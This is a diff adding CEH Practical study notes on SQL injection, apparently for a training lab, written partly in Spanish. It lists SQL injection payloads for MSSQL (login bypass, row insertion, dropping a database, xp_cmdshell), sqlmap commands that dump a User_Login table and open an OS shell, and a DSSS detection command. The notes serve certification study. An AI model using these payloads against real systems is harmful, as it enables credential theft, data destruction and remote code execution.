@@ -1,0 +1,44 @@
+CEH Practical Notes
+------------------------------------------------
+Modulo 15 - SQL Injection
+------------------------------------------------
+
+# La inyección de SQL se puede utilizar para implementar los siguientes ataques:
+
+	- Omisión de autenticación: un atacante inicia sesión en una aplicación sin proporcionar un nombre de usuario y contraseña válidos y obtiene privilegios administrativos.
+	- Omisión de autorización: un atacante altera la información de autorización almacenada en la base de datos aprovechando las vulnerabilidades de inyección de SQL.
+	- Divulgación de información: un atacante obtiene información confidencial que se almacena en la base de datos
+	- Integridad de datos comprometida: un atacante desfigura una página web, inserta contenido malicioso en páginas web o altera el contenido de una base de datos.
+	- Disponibilidad de datos comprometida: un atacante elimina información específica, el registro o la información de auditoría en una base de datos
+	- Ejecución remota de código: un atacante ejecuta un fragmento de código de forma remota que puede comprometer el sistema operativo host.
+
+1 - Perform SQL injection attacks
+
+	1.1 - Perform an SQL injection attack on an MSSQL database
+		># x' or 1=1 --
+		># x'; insert into login values ('john', 'apple123'); --
+		># x'; create database mydatabase; --
+		># x'; drop database mydatabase; --
+		># x'; exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --
+
+	1.2 - Perform an SQL injection attack against MSSQL to extract databases using sqlmap
+		># sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --dbs
+		># sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D moviescope --tables
+		># sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" -D moviescope -T User_Login --dump
+		># sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]" --os-shell
+
+		# Otras herramientas para SQL Injection:
+		 
+			Mole (https://sourceforge.net)
+			Blisqy (https://github.com)
+			blind-sql-bitshifting (https://github.com)
+			bsql (https://github.com)
+			NoSQLMap (https://github.com)
+ 
+2 - Detect SQL injection vulnerabilities using various SQL injection detection tools
+ 
+	2.1 - Detect SQL injection vulnerabilities using DSSS
+		># python3 dsss.py -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value]"
+
+		
+	2.2 - Detect SQL injection vulnerabilities using OWASP ZAP
